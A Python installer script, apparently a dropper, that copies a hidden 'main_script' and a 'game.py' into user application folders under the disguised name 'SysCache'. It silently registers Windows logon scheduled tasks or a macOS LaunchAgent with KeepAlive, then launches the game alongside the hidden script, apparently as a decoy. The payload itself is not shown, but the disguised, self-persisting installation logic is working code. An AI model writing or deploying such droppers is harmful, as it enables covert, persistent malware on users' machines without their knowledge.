import os
import sys
import shutil
import subprocess
import platform

APP_NAME = "SysCache"
WIN_TASK_NAME = "SysCacheTask"
MAC_LABEL = "com.syscache"

SYSTEM = platform.system()
IS_WINDOWS = SYSTEM == "Windows"
IS_MAC = SYSTEM == "Darwin"

if IS_WINDOWS:
    INSTALL_DIR = os.path.join(os.getenv("APPDATA"), APP_NAME)
elif IS_MAC:
    INSTALL_DIR = os.path.expanduser(f"~/Library/Application Support/{APP_NAME}")
else:
    raise RuntimeError(f"Sistema não suportado: {SYSTEM}")


def get_resource_path(filename: str) -> str:
    base_dir = os.path.dirname(os.path.abspath(__file__))
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(base_dir, filename)


def create_install_dir() -> None:
    os.makedirs(INSTALL_DIR, exist_ok=True)


def copy_file_to_install(filename: str) -> str:
    src = get_resource_path(filename)
    if not os.path.exists(src):
        raise FileNotFoundError(f"Arquivo não encontrado: {src}")
    dst = os.path.join(INSTALL_DIR, filename)
    shutil.copy2(src, dst)
    return dst


def install_windows() -> None:
    main_exe_path = copy_file_to_install("main_script.exe")
    game_path = copy_file_to_install("game.py")

    subprocess.run(
        f'schtasks /delete /tn "{WIN_TASK_NAME}" /f',
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    cmd = (
        f'schtasks /create /tn "{WIN_TASK_NAME}" '
        f'/tr "\\"{main_exe_path}\\"" /sc onlogon /f'
    )
    subprocess.run(cmd, shell=True, check=True)

    subprocess.Popen([main_exe_path], shell=False)

    python_cmd = shutil.which("python") or shutil.which("pythonw") or sys.executable
    subprocess.Popen([python_cmd, game_path], shell=False)


def install_mac() -> None:
    main_script_path = copy_file_to_install("main_script_mac.py")
    game_path = copy_file_to_install("game.py")

    python_cmd = shutil.which("python3") or sys.executable
    plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{MAC_LABEL}.plist")

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{MAC_LABEL}</string>

    <key>ProgramArguments</key>
    <array>
        <string>{python_cmd}</string>
        <string>{main_script_path}</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>WorkingDirectory</key>
    <string>{INSTALL_DIR}</string>
</dict>
</plist>
"""

    os.makedirs(os.path.dirname(plist_path), exist_ok=True)
    with open(plist_path, "w", encoding="utf-8") as f:
        f.write(plist_content)

    subprocess.run(
        ["launchctl", "unload", plist_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(["launchctl", "load", plist_path], check=True)

    subprocess.Popen([python_cmd, main_script_path], shell=False)
    subprocess.Popen([python_cmd, game_path], shell=False)


if __name__ == "__main__":
    create_install_dir()

    if IS_WINDOWS:
        install_windows()
    elif IS_MAC:
        install_mac()